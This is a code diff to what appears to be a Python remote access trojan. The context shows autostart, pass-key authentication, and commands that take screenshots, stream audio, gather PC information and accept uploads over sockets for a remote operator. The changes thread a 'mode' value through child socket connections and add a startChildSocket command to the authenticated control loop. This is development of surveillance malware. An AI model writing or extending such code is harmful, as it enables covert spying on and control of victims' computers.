@@ -218,11 +218,12 @@ def GetWindowTitle():
 
 
 class childSocket(threading.Thread):
-    def __init__(self, id):
+    def __init__(self, id, mode):
         super(childSocket, self).__init__()
 
         self.active = True
         self.id = id
+        self.mode = mode
 
     def run(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -234,7 +235,7 @@ class childSocket(threading.Thread):
                 if data == 'pcinfo':
                     Send(self.socket, PCINFO(), mode)
                 else:
-                    Send(self.socket, self.id, mode)
+                    Send(self.socket, self.mode + ' ' + self.id, mode)
             except socket.error:
                 return
 
@@ -271,10 +272,11 @@ class audioStreaming(threading.Thread):
         self.p.terminate()
 
 
-def startChildSocket(id):
-    socketsBank[id] = childSocket(id)
+def startChildSocket(id, mode):
+    socketsBank[id] = childSocket(id, mode)
     socketsBank[id].setDaemon(True)
     socketsBank[id].start()
+    return id
 
 
 def fromAutostart():
@@ -300,7 +302,7 @@ def fromAutostart():
                     Send(s, SCREENSHOT(), mode)
                     continue
                 if data.startswith('startChildSocket'):
-                    Send(s, startChildSocket(str(data.split(' ')[-1])), mode)
+                    Send(s, startChildSocket(str(data.split(' ')[-1]), mode), mode)
                     continue
                 if data == passKey:
                     active = True
@@ -312,6 +314,8 @@ def fromAutostart():
                             break
                         if data == 'info':
                             stdoutput = PCINFO()
+                        elif data.startswith('startChildSocket'):
+                            stdoutput = startChildSocket(str(data.split(' ')[-1]), mode)
                         elif data == 'getScreen':
                             stdoutput = SCREENSHOT()
                         elif data.startswith('upload '):
